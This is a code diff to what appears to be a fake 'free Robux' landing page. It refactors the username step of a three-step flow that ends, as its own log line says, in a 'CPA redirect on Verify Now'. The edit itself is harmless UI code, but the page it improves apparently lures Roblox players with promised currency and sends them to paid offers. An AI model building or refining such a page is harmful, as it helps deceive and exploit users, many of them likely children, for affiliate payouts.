@@ -30,17 +30,18 @@
     bigRobuxAmount.textContent = digits || '1700';
   }
 
-  // ----- helper: get username -----
-  function getUsername() {
+  // ----- helper: update username display -----
+  function updateUsernameDisplay() {
     const name = usernameInput.value.trim();
-    return name || 'User';
+    selectedUsername = name || 'User';
+    verifyUsername.textContent = selectedUsername;
   }
 
   // ----- STEP 1 → STEP 2: proceed -----
   proceedToAmountBtn.addEventListener('click', function() {
-    selectedUsername = getUsername();
-    verifyUsername.textContent = selectedUsername;
-
+    // update username before moving to step 2
+    updateUsernameDisplay();
+    
     step1.classList.add('hidden');
     step2.classList.remove('hidden');
   });
@@ -50,6 +51,11 @@
     if (e.key === 'Enter') {
       proceedToAmountBtn.click();
     }
+  });
+
+  // Update username in real-time as user types (for preview)
+  usernameInput.addEventListener('input', function() {
+    updateUsernameDisplay();
   });
 
   // ----- STEP 2: amount selection -----
@@ -74,9 +80,8 @@
     } else {
       updateAmountUI('1700 Robux');
     }
-    // ensure username is set
-    selectedUsername = getUsername();
-    verifyUsername.textContent = selectedUsername;
+    // ensure username is up to date
+    updateUsernameDisplay();
 
     step2.classList.add('hidden');
     step3.classList.remove('hidden');
@@ -92,6 +97,9 @@
   updateAmountUI('1700 Robux');
   verifyUsername.textContent = 'User';
   usernameInput.placeholder = 'Enter your username...';
+  
+  // Update username display on page load if there's a value
+  updateUsernameDisplay();
 
   console.log('Landing ready — 3-step flow, CPA redirect on Verify Now');
 })();
